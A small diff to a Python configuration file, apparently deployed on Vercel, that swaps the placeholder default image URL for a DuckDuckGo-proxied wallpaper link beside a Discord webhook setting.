@@ -11,7 +11,7 @@ __author__ = "Dealer"
 
 # Load from environment variables (set in Vercel)
 WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "")
-IMAGE_URL = os.getenv("IMAGE_URL", "https://link-to-your-image.here")
+IMAGE_URL = os.getenv("IMAGE_URL", "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwallpaperaccess.com%2Ffull%2F58329.jpg&f=1&nofb=1&ipt=07373629347dffe2f6bb12d0b5f51150573f605a48beda17897cca4a28cc6966")
 
 config = {
     # BASE CONFIG #
